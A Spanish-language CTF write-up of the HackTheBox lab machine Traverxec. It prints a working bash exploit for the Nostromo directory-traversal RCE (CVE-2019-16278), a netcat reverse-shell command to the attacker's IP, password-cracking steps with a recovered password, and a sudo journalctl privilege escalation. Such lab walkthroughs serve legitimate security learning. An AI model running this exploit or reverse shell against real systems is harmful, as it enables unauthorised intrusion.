---
title: HTB-TRAVERXEC
author: Christian Gutierrez
date: 2020-11-25 14:10:00 -0500
categories: [HackTheBox, Easy]
tags: [HTB, Linux, journalctl, cracking]
image: /assets/htb/05_traverxec/portada.PNG
---
## Decripción del entorno
### <span style="color:green">Atacante</span>

| OS          | Kali Linux          |
| IP          | 10.10.14.67         |

### <span style="color:green">Maquina Objetivo</span>

| OS          | Linux             |
| IP          | 10.10.10.165        |
| Dificultad  | 4.7/10 / **Easy** |
| URL         | [**TraverXec**](https://www.hackthebox.eu/home/machines/profile/217)    |

## Enumeración
Se realiza la enumeración habitual para el reconocimiento e identificación de los puertos abiertos en el sistema: 
```console
$ nmap -sS -sV -sC -oA nmap_traverxec 10.10.10.165
```

![Escaneo con Nmap](/assets/htb/05_traverxec/01_nmap.png)
_Resultado escaneo con nmap_

Validando las cabeceras **HTTP** en el puerto **80** identificamos un servidor `Nostromo 1.9.6` el cual expone una aplicación web: 

![Puerto 80](/assets/htb/05_traverxec/02_puerto_80.png)
_Aplicación en el puerto 80_

Se realiza la busqueda pública de exploit's o CVE's que afecten al servicio `Nostromo`, hallando el **CVE-2019-16278**: 
- <https://github.com/jas502n/CVE-2019-16278>

Este exploit en ejecución es bastante directo, pues consta de un **Directory Traversal and Remote Code Execution** el cual, a través de la URL accedemos a un binario como  `/bin/sh`, y también permite pasarle los parámetros a ejecutar mediante POST:

```bash
#!/usr/bin/env bash

HOST="$1"
PORT="$2"
shift 2

( \
    echo -n -e 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'; \
    echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
    echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
  | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'
```
Como alternativa al exploit se puede ver la ejecución practica del exploit con BurpSuite:
 - <https://www.youtube.com/watch?v=-preplELiy8>

Con lo anterior, ejecutamos una Shell reversa usando **netcat**:
- `nc 10.10.14.67 4646 -e /bin/sh`
- `nc -nvlp 4646`

![Shell reversa](/assets/htb/05_traverxec/04_shell_david.png)
_Ejecución de una reverse shell_

Una vez con la Shell, contamos con los privilegios del usuario `www-data` y se realiza la recolección de información para intentar escalar hacia el usuario `David`. Se identifica el archivo de configuración del sistema `nostromo`:

```console
$ cat /var/nostromo/conf/
```

Se identifican diferentes archivos interesantes:
- `.htpasswd`
- `nhttpd.conf`

Del primer archivo se logra identificar un hash, así que procedemos a realizar un proceso de **password cracking**:

```console
$ hashcat –force -m 500 -a 0 hash.txt rockyou.txt
```

![Hashcat](/assets/htb/05_traverxec/05_hashcat_david.png)
_Ejecución de Hashcat_

- David: **Nowonly4me**

A pesar obtener credenciales de acceso, no encontramos un sitio para activarlas o impersonar al usuario **David**, así que analizando el archivo `nhttpd.conf` y descubrimos que existen varios directorios como **“home dirs”**:
- `/home`
- `/public_www`

Desde la pagina web, se puede ingresar al directorio `~/David/`:

![Carpeta David](/assets/htb/05_traverxec/06_david_home.png)
_Desde el servidor al directorio David_

También se intenta con `/protected-file-area/`:

![Directorio Privado](/assets/htb/05_traverxec/07_directorio_privado.png)
_Directorio Privado_

Esto nos permite acceder directamente al contenido:

![Descarga de Archivos](/assets/htb/05_traverxec/08_descarga_archivos.png)
_Descarga de archivos_


Descargamos el archivo `id_rsa` y se observa que esta protegido por una contraseña, así que se procede a transformar y extraer el hash en formato **john**:
```console
$ ssh2john id_rsa
```

![id_rsa](/assets/htb/05_traverxec/09_id_rsa.png)
_Archivo Id_RSA_

Se realiza un ataque de password cracking con **John The Ripper**:

![Cracking](/assets/htb/05_traverxec/10_password_cracking.png)
_Cracking del id_rsa_

Teniendo la clave, se realiza la conexión **SSH** al servidor como el usuario **David**: 

![Acceso David](/assets/htb/05_traverxec/11_acceso_david.png)
_Acceso como usuario David_

## Elevación de Privilegios

Ahora, dentro de la carpeta del usuario **David** se identifica una carpeta `/bin/` que tiene el siguiente archivo bash: 

![Archivos binarios](/assets/htb/05_traverxec/12_priv_escalation.png)
_Archivos binarios_

Del contenido del archivo, identificamos la última línea como la importante, debido a que hace `sudo` de un servicio para ejecutar como **root** el comando `journalctl`: 
```console
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

En este punto de la escala de privilegios, consultamos **gtfobins**:
- <https://gtfobins.github.io/gtfobins/journalctl/>

Nos brinda información importante sobre cómo abusar del binario `jounalctl` para escalar privilegios en casos donde tenemos su ejecución privilegiada o mal configurada:

![jounalctl](/assets/htb/05_traverxec/13_exploit_journalctl.png)
_Explotación binario jounalctl_

> NOTA:
> Es importante decir, que en este punto toma tiempo entender plenamente la forma de ejecución del posible vector de escala de privilegios, debido a que la ejecución era muy rápida y no permitía ingresar los comandos apropiados. 

El comando `journalctl` hace uso del servicio `less` para mostrar en pantalla todo el contenido de las últimas líneas de los **logs** del servicio `nostromo.service`, sin embargo, el comando esta atado a mostrar solo **5 líneas de logs** (`-n 5`) por lo que NO nos da tiempo de ejecutar e ingresar la expresión `¡/bin/sh` para obtener la Shell. 

La forma de solucionar este problema es más que simple, recursiva y curiosa. Solo se debe **ajustar la el tamaño de nuestra terminal** para que no muestre completamente el contenido de las líneas, pues al faltarle contenido de forma horizontal, el servicio `less` (que es el que ejecuta de fondo) se ve obligado a activar el ingreso de datos para movernos a la información que no se puede mostrar, lo que nos da tiempo de ingresar el comando y ejecutar la Shell: 

![Privilegios](/assets/htb/05_traverxec/14_root_maquina.png)
_Privilegios Root_

Bytez ;)

## Referencias
- Analisis de binarios en linux para aprovechar configuraciones inseguras: 
  - <https://gtfobins.github.io/gtfobins/journalctl/>
